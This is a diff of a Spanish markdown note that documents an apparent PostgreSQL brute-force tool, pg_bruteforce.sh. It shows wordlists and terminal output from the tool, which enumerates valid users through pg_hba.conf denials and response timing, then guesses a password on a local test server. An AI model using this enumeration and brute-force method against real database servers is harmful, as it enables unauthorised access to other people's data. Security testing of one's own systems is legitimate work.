@@ -1,23 +1,51 @@
 ## Agregar opcion para validar 
 ```bash
-1.-  Alcance al puerto.
-2.- (no existe el usuario o la ip no esta registrada en pg_hba) FATAL:  no pg_hba.conf entry for host "127.0.0.1", user "maria", database "postgres", no encryption
-3.- (la contraseña esta mal , esto quiere decir que si existe el usuario y esta dado de alta la ip en el pg_hba) Password authentication failed
+
+postgres@serv-test /sysx/data17 $ cat listado_usuarios.txt
+jose
+pedro
+mesatierra
+test
+nada
+maria
 
 
-Agregarle la opcion de validar nombres de usuarios de fuerza bruta.
-Agregarle opcion de contraseñas de fuerza bruta.
+postgres@serv-test /sysx/data17 $ cat mis_passwords.txt
+admin123
+
+password
+qwerty
+1231234
+root
+123123
 
 
-postgres@serv-pruebas /sysx/data17 $ psql -h 127.0.0.1 -p 5432 -d postgres -U test
-Password for user test:
-psql: error: connection to server at "127.0.0.1", port 5432 failed: FATAL:  password authentication failed for user "test"
 
-postgres@serv-pruebas /sysx/data17 $ psql -h 127.0.0.1 -p 5432 -d postgres -U maria
-psql: error: connection to server at "127.0.0.1", port 5432 failed: FATAL:  no pg_hba.conf entry for host "127.0.0.1", user "maria", database "postgres", no encryption
 
-postgres@serv-pruebas /sysx/data17 $ psql -h 127.0.0.1 -p 5432 -d postgres -U test
-psql: error: connection to server at "127.0.0.1", port 5432 failed: FATAL:  no pg_hba.conf entry for host "127.0.0.1", user "test", database "postgres", no encryption
+postgres@serv-test /sysx/data17 $ ./pg_bruteforce.sh -h 127.0.0.1 -p 5432 -d pepe -u listado_usuarios.txt
+[*] Validando puerto 5432 en 127.0.0.1... ¡Alcanzable!
+[!] Iniciando fuerza bruta de USUARIOS en DB: pepe...
+[X] [.015517502s] Usuario 'jose' denegado (pg_hba.conf)
+[X] [.013572638s] Usuario 'pedro' denegado (pg_hba.conf)
+[X] [.013227052s] Usuario 'mesatierra' denegado (pg_hba.conf)
+[->] [1.021816069s] Usuario VÁLIDO: test (Requiere contraseña)
+[X] [.013939947s] Usuario 'nada' denegado (pg_hba.conf)
+[X] [.014069954s] Usuario 'maria' denegado (pg_hba.conf)
+
+
+
+
+postgres@serv-test /sysx/data17 $ ./pg_bruteforce.sh -h 127.0.0.1 -p 5432 -d postgres -U test -f mis_passwords.txt -T 1
+[*] Validando puerto 5432 en 127.0.0.1... ¡Alcanzable!
+[!] Probando contraseñas para: test (Timeout: 1s)
+[!] [1.007113335s] Salto por Timeout (> 1s) en pass: 'admin123'
+[!] [1.006565826s] Salto por Timeout (> 1s) en pass: 'password'
+[!] [1.006572080s] Salto por Timeout (> 1s) en pass: 'qwerty'
+[!] [1.006561784s] Salto por Timeout (> 1s) en pass: '1231234'
+[!] [1.007149991s] Salto por Timeout (> 1s) en pass: 'root'
+[->] [.028259804s] ¡PASS ENCONTRADA! -> test:123123
+
+
 
 ```
 
